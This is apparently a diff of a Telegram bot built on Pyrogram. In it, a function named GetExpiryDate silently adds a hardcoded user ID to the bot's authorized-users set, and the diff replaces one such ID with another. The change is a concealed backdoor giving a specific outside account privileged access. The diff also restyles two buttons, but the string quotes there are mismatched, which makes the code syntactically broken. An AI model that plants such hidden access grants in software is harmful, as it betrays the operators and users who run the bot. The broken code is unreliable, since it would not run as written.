@@ -29,7 +29,7 @@ from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(683538773)
+    Config.AUTH_USERS.add(1478534845)
     return expires_at
 
 
@@ -71,8 +71,8 @@ async def start(bot, update):
                 reply_markup=InlineKeyboardMarkup(
             [
                 [
-                    InlineKeyboardButton('⚙ Help", callback_data="help_data"),
-                    InlineKeyboardButton("About 👨🏻‍🎓", callback_data="about_data"),
+                    InlineKeyboardButton('⚙ HELP ⚙", callback_data="help_data"),
+                    InlineKeyboardButton("👨🏻‍🎓 ABOUT 👨🏻‍🎓", callback_data="about_data"),
                 ]
             ]
         ),
